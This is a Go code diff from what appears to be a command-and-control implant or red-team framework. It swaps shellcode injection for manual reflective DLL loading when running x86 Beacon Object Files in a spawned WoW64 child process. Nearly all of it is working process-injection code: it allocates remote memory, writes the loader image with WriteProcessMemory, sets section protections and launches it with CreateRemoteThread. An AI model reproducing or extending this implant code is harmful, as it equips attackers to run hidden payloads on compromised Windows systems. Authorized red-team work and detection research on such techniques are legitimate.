@@ -66,9 +66,16 @@ const (
 // Execute call — no state contamination between calls, the
 // helper process is terminated and released after each
 // invocation. Matches CS fork-and-run semantics.
+//
+// The `loaderDLL` slice is the i386 PE32 DLL bytes produced by
+// scripts/build-bof-x86-loader.sh, embedded via go:embed under
+// the bof_x86_loader build tag. Each Execute manually
+// reflectively loads this DLL into a fresh WoW64 host: parses
+// the PE header, VirtualAllocEx's the image, copies + relocates
+// sections, then CreateRemoteThread targets the BOFExec export.
 type x86BOF struct {
 	bofBytes  []byte
-	shellcode []byte
+	loaderDLL []byte
 
 	timeout  time.Duration
 	outCap   uint32
@@ -101,22 +108,16 @@ func (x *x86BOF) Execute(args []byte) ([]byte, error) {
 	defer windows.CloseHandle(pi.Thread)
 	defer windows.TerminateProcess(pi.Process, 1)
 
-	// Region 1: shellcode (will become RX after VirtualProtectEx).
-	codeAddr, err := allocRemote(pi.Process, uintptr(len(x.shellcode)),
-		windows.PAGE_READWRITE)
+	// Region 1: manual reflective DLL load. Allocate the full
+	// SizeOfImage RW, parse + lay + relocate the loader DLL
+	// against the allocated base, WriteProcessMemory the whole
+	// image in one shot, then VirtualProtectEx each section to
+	// its proper permissions (PAGE_READONLY / RW / EXECUTE_READ).
+	codeAddr, entryAddr, err := reflectiveLoadIntoChild(pi.Process, x.loaderDLL)
 	if err != nil {
-		return nil, fmt.Errorf("runtime/bof/x86: alloc code: %w", err)
+		return nil, fmt.Errorf("runtime/bof/x86: reflective load: %w", err)
 	}
-	if err := windows.WriteProcessMemory(pi.Process, codeAddr,
-		&x.shellcode[0], uintptr(len(x.shellcode)), nil); err != nil {
-		return nil, fmt.Errorf("runtime/bof/x86: write code: %w", err)
-	}
-	var oldProtect uint32
-	if err := windows.VirtualProtectEx(pi.Process, codeAddr,
-		uintptr(len(x.shellcode)), windows.PAGE_EXECUTE_READ,
-		&oldProtect); err != nil {
-		return nil, fmt.Errorf("runtime/bof/x86: protect code: %w", err)
-	}
+	_ = codeAddr // reserved for diagnostics; entry is computed from the exported BOFExec RVA
 
 	// Region 2: IO buffers laid out back-to-back. The layout is
 	//   [ BOF | args | user_data | spawn_to(NUL-term) | OUT | ERR ]
@@ -175,7 +176,7 @@ func (x *x86BOF) Execute(args []byte) ([]byte, error) {
 	// reads off the stack.
 	hThread, _, callErr := api.ProcCreateRemoteThread.Call(
 		uintptr(pi.Process), 0, 0,
-		codeAddr,
+		entryAddr,
 		paramsAddr,
 		0,
 		0,
@@ -448,7 +449,7 @@ func (coffX86Loader) Load(b []byte) (Runnable, error) {
 	copy(bofCopy, b)
 	return &x86BOF{
 		bofBytes:  bofCopy,
-		shellcode: sc,
+		loaderDLL: sc,
 		timeout:   defaultX86Timeout,
 		outCap:    defaultX86OutputCapacity,
 		errCap:    defaultX86ErrorCapacity,
